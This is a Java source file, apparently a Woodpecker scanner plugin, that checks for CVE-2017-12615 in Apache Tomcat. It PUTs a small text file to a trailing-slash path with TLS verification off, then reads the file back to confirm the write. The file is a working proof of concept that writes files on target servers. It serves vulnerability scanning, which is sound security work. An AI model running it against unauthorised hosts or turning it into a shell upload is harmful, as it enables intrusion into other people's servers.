package me.gv7.woodpecker.vuldb.CVE_2017_12615.poc;

import me.gv7.woodpecker.plugin.IPoc;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.plugin.IScanResult;
import me.gv7.woodpecker.plugin.ITarget;
import me.gv7.woodpecker.vuldb.CVE_2017_12615.CVE_2017_12615_Plugin;
import net.dongliu.requests.RawResponse;
import net.dongliu.requests.Requests;

public class CVE_2017_12615_Poc implements IPoc {
    public IScanResult doCheck(ITarget target, IResultOutput iResultOutput) {
        IScanResult scanResult = CVE_2017_12615_Plugin.pluginHelper.createScanResult();
        String strRandom = "xxxx";
        String vulURL = target.getRootAddress()+ String.format("%s.txt/",strRandom);
        RawResponse putResp = Requests.put(vulURL).body(strRandom).verify(false).send();
        iResultOutput.infoPrintln(putResp.getHeaders().get(0).getValue());

        try {
            Thread.sleep(1000L);
        }catch (Exception e){
        }
        String pocURL = target.getRootAddress() + String.format("%s.txt",strRandom);
        RawResponse response = Requests.get(pocURL).verify(false).send();
        if(response.readToText().contains(strRandom)){
            String msg = String.format("/%s.txt be created",strRandom);
            scanResult.setExists(true);
            scanResult.setMsg(msg);
        }
        return scanResult;
    }
}
